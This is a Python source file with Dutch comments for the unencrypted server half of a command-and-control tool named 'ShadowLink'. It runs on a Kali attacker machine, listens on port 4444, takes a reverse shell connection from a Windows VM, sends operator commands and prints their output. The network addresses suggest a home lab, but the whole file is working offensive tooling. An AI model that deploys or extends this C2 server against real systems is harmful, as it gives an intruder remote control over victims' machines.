#!/usr/bin/env python3
"""
ShadowLink C2 server - Fase 2 v1 (basis reverse shell, onversleuteld)
Draait op Kali (aanvaller). Luistert op 0.0.0.0:4444 en ontvangt de
reverse-verbinding van de client op de Windows VM.

Protocol: elk bericht = 4-byte big-endian lengteprefix + payload (bytes).
Dit framing is nodig omdat TCP een stream is: recv() levert geen complete
"berichten" op, dus zonder lengteprefix knip je output fout op.
"""
import socket
import struct

HOST = "0.0.0.0"   # luister op alle interfaces (eth1 = host-only 192.168.174.128)
PORT = 4444


def send_msg(conn, data: bytes):
    """Verstuur een bericht met 4-byte lengteprefix."""
    conn.sendall(struct.pack("!I", len(data)) + data)


def recv_msg(conn) -> bytes | None:
    """Ontvang een bericht met 4-byte lengteprefix. None bij verbroken verbinding."""
    header = b""
    while len(header) < 4:
        chunk = conn.recv(4 - len(header))
        if not chunk:
            return None
        header += chunk
    length = struct.unpack("!I", header)[0]

    payload = b""
    while len(payload) < length:
        chunk = conn.recv(min(4096, length - len(payload)))
        if not chunk:
            return None
        payload += chunk
    return payload


def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((HOST, PORT))
    server.listen(1)
    print(f"[*] ShadowLink C2 luistert op {HOST}:{PORT} ...")

    conn, addr = server.accept()
    print(f"[+] Verbinding binnen van {addr[0]}:{addr[1]}")

    try:
        while True:
            cmd = input("shadowlink> ").strip()
            if not cmd:
                continue

            send_msg(conn, cmd.encode())

            if cmd.lower() in ("exit", "quit"):
                print("[*] Sessie afgesloten.")
                break

            result = recv_msg(conn)
            if result is None:
                print("[-] Client heeft de verbinding verbroken.")
                break
            # Windows-console output is meestal cp850, decodeer tolerant
            print(result.decode("utf-8", errors="replace"))
    except KeyboardInterrupt:
        print("\n[*] Onderbroken door gebruiker.")
    finally:
        conn.close()
        server.close()


if __name__ == "__main__":
    main()

